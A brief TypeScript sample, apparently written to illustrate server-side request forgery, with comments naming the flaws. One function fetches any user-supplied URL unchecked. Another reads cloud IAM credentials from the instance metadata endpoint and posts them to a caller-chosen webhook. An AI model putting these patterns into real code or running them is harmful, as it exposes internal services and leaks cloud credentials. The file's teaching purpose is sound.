// Server-Side Request Forgery + the "lethal trifecta": untrusted input reaches
// an outbound fetch that can hit internal/metadata endpoints and exfiltrate.

// Fetches an ARBITRARY user-provided URL with no allow-list (classic SSRF).
export async function fetchPreview(userUrl: string): Promise<string> {
  const res = await fetch(userUrl);
  return res.text();
}

// Reads the cloud instance metadata service (credentials!) and forwards it to
// a user-controlled webhook — private data + untrusted sink = exfiltration path.
export async function reportMetadata(webhook: string): Promise<void> {
  const creds = await (
    await fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
  ).text();
  await fetch(webhook, { method: "POST", body: creds });
}
